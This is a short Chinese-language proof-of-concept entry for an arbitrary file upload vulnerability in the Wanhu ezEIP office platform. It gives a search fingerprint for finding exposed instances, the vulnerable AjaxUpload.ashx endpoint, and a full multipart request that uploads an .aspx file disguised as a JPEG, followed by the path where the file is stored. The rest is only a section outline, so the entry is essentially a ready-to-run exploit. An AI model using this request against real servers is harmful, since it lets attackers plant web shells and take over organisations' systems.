# 万户协同办公平台ezEIP存在任意文件上传漏洞

- **系统**：万户协同办公平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="万户网络-ezEIP"`
- **请求**：`POST /whir_system/Res/assets/js/fileinput/js/AjaxUpload.ashx HTTP/1.1`
- **关键头**：`Content-Length: 463`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryn46FImBF…`

**请求体 / payload**
```
------WebKitFormBoundaryn46FImBFEXYi9lZ2
Content-Disposition: form-data;name="txt_file"; filename="1.aspx"
Content-Type: image/jpeg
hello
------WebKitFormBoundaryn46FImBFEXYi9lZ2
Content-Disposition: form-data; name="\g"
Upload!
------WebKitFormBoundaryn46FImBFEXYi9lZ2--
/uploadfiles/202405255100068868.aspx
```

**其他**
- 万户协同办公平台 ezEIP 存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 万户ezEIP